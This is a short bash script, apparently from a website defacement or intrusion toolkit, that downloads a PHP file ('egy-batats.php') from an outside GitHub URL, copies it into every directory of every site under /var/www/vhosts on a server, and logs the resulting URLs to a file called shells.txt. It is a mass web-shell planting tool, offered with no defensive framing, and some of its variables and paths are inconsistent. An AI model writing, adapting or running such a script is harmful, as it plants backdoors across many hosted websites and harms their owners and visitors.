#!/bin/bash
#love_betohat_"BAH"
wget https://raw.githubusercontent.com/BETO-2FA/TXT-SOURCE/main/egy-batats.php -O /root/egy-batats.php
mkdir /tmp/hello-index
ls -la /var/www/vhosts/ | awk '{print $9}' > /tmp/betobeh
for i in `more /tmp/betobeh `
do
	find /var/www/vhost/$i -type d -exec cp /root/egy-batats.php {} \;
	echo " [*] $i -> Done"
	echo "https://$i/$shell" >> /var/www/vhosts/shells.txt
done
